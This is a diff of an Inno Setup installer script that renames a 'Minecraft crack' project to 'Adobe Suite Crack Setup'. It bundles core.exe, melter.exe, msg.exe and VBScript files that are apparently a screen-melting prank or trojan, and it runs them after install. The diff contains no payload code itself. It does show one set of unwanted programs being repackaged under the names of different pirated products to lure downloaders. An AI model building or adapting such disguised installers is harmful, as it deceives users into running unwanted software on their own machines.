@@ -22,9 +22,9 @@ UsedUserAreasWarning=no
 ; Uncomment the following line to run in non administrative install mode (install for current user only.)
 ;PrivilegesRequired=lowest
 PrivilegesRequiredOverridesAllowed=dialog
-OutputDir=C:\Users\Chaxiraxi\Desktop\Minecraft crack\Source Code
+OutputDir=C:\Users\Chaxiraxi\Desktop\Adobe Suite Crack\Source Code
 OutputBaseFilename=Adobe Suite Crack Setup
-SetupIconFile=C:\Users\Chaxiraxi\Desktop\Minecraft crack\Source Code\icon.ico
+SetupIconFile=C:\Users\Chaxiraxi\Desktop\Adobe Suite Crack\Source Code\icon.ico
 Compression=lzma
 SolidCompression=yes
 WizardStyle=modern
@@ -37,12 +37,12 @@ Name: "desktopicon"; Description: "{cm:CreateDesktopIcon}"; GroupDescription: "{
 Name: "quicklaunchicon"; Description: "{cm:CreateQuickLaunchIcon}"; GroupDescription: "{cm:AdditionalIcons}"; Flags: unchecked; OnlyBelowVersion: 6.1; Check: not IsAdminInstallMode
 
 [Files]
-Source: "C:\Users\Chaxiraxi\Desktop\Minecraft crack\Source Code\core.exe"; DestDir: "{app}"; Flags: ignoreversion
-Source: "C:\Users\Chaxiraxi\Desktop\Minecraft crack\Source Code\melter.exe"; DestDir: "{app}"; Flags: ignoreversion
-Source: "C:\Users\Chaxiraxi\Desktop\Minecraft crack\Source Code\msg.exe"; DestDir: "{app}"; Flags: ignoreversion
-Source: "C:\Users\Chaxiraxi\Desktop\Minecraft crack\Source Code\msgbox.vbs"; DestDir: "{app}"; Flags: ignoreversion
-Source: "C:\Users\Chaxiraxi\Desktop\Minecraft crack\Source Code\song.mp3"; DestDir: "{app}"; Flags: ignoreversion
-Source: "C:\Users\Chaxiraxi\Desktop\Minecraft crack\Source Code\song.vbs"; DestDir: "{app}"; Flags: ignoreversion
+Source: "C:\Users\Chaxiraxi\Desktop\Adobe Suite Crack\Source Code\core.exe"; DestDir: "{app}"; Flags: ignoreversion
+Source: "C:\Users\Chaxiraxi\Desktop\Adobe Suite Crack\Source Code\melter.exe"; DestDir: "{app}"; Flags: ignoreversion
+Source: "C:\Users\Chaxiraxi\Desktop\Adobe Suite Crack\Source Code\msg.exe"; DestDir: "{app}"; Flags: ignoreversion
+Source: "C:\Users\Chaxiraxi\Desktop\Adobe Suite Crack\Source Code\msgbox.vbs"; DestDir: "{app}"; Flags: ignoreversion
+Source: "C:\Users\Chaxiraxi\Desktop\Adobe Suite Crack\Source Code\song.mp3"; DestDir: "{app}"; Flags: ignoreversion
+Source: "C:\Users\Chaxiraxi\Desktop\Adobe Suite Crack\Source Code\song.vbs"; DestDir: "{app}"; Flags: ignoreversion
 ; NOTE: Don't use "Flags: ignoreversion" on any shared system files
 
 [Icons]
@@ -53,4 +53,3 @@ Name: "{userappdata}\Microsoft\Internet Explorer\Quick Launch\{#MyAppName}"; Fil
 
 [Run]
 Filename: "{app}\{#MyAppExeName}"; Description: "{cm:LaunchProgram,{#StringChange(MyAppName, '&', '&&')}}"; Flags: nowait postinstall skipifsilent
-
